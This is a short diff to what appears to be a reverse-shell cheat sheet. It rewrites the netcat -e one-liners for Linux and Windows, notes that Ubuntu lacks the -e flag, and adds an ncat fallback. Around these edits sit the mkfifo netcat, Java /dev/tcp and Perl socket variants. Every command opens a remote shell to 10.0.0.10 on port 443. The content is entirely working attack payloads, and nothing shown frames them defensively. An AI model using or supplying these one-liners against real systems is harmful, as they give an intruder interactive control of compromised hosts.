@@ -776,13 +776,15 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/443;cat <&5 | while rea
 p.waitFor()
 
 - Netcat Linux
-nc -e /bin/sh 10.0.0.10 443
+nc 10.0.0.10 443 -e /bin/sh
 
 - Netcat Windows
-nc -e cmd.exe 10.0.0.10 443
+nc 10.0.0.10 443 -e cmd.exe
 
-- Netcat without -e flag
+- Ubuntu does not allow the -e flag
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 443 > /tmp/f
+If that doesn't work install ncat.
+ncat 10.0.0.10 443 -e /bin/sh
 
 - Perl
 perl -e 'use Socket;$i="10.0.0.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
